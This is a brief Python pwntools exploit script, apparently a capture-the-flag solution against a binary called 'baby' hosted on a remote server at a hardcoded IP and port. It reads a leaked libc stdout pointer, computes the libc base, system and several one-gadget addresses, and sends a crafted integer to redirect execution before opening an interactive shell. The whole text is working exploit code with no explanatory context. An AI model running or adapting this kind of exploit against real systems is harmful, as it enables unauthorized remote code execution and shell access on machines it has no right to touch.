#!/usr/bin/python

from pwn import *
from LibcSearcher import *

def convert(positive):
    return ((positive^0xffffffff)+1)

config = '''
b *0x080485bd
'''
#s = process('./baby')
s = remote('45.76.161.20', 19509)
#pause()
#gdb.attach(s, config)


context.log_level = 'debug'
leak            = s.recv(4)
_IO_2_1_stdout_ = u32(leak)
libc            = LibcSearcher("_IO_2_1_stdout_", _IO_2_1_stdout_)
base            = _IO_2_1_stdout_ - libc.dump('_IO_2_1_stdout_')
system          = base + libc.dump('system')
one1            = base + 0x3d0d3
one2            = base + 0x3d0d5
one3            = base + 0x3d0d9
one4            = base + 0x3d0e0
one5            = base + 0x67a7f
one6            = base + 0x67a80
one7            = base + 0x137e5e
one8            = base + 0x137e5f
log.success('_IO_2_1_stdout_: ' + hex(_IO_2_1_stdout_))
log.success('base: ' + hex(base))
log.success('system: ' + hex(system)) 


s.sendline(str(-convert(one2)))
s.interactive()
